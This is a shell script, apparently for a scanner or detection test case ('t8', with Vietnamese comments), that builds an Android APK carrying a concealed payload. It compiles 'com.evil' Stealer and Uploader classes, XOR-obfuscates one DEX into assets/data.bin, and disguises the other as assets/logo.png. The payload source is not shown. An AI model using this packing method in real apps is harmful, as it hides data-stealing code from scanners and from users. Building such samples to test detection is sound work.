#!/bin/sh
# Build app test t8 (payload DEX ẩn). Cần Android SDK (build-tools + android-34).
set -e; cd "$(dirname "$0")"
BT=${BT:-$HOME/Android/Sdk/build-tools/36.0.0}; AJ=${AJ:-$HOME/Android/Sdk/platforms/android-34/android.jar}
rm -rf cls pcls out p1 p2 assets t8.apk; mkdir -p cls pcls out p1 p2 assets
javac -nowarn --release 11 -cp $AJ -d cls src/com/rdict/t8/*.java 2>&1 | grep -v "^Note" || true
javac -nowarn --release 11 -cp $AJ:cls -d pcls payload/com/evil/*.java 2>&1 | grep -v "^Note" || true
$BT/d8 --min-api 24 --lib $AJ --output out $(find cls -name "*.class")
$BT/d8 --min-api 24 --lib $AJ --classpath cls --output p1 pcls/com/evil/Stealer.class
$BT/d8 --min-api 24 --lib $AJ --classpath cls --output p2 pcls/com/evil/Uploader.class
python3 -c "import sys;d=open('p1/classes.dex','rb').read();open('assets/data.bin','wb').write(bytes(b^0x5a for b in d))"
(cd p2 && zip -q ../assets/logo.png classes.dex)
$BT/aapt2 link -o t8.apk -I $AJ --manifest AndroidManifest.xml -A assets && (cd out && zip -q ../t8.apk classes.dex)
rm -rf cls pcls out p1 p2 assets
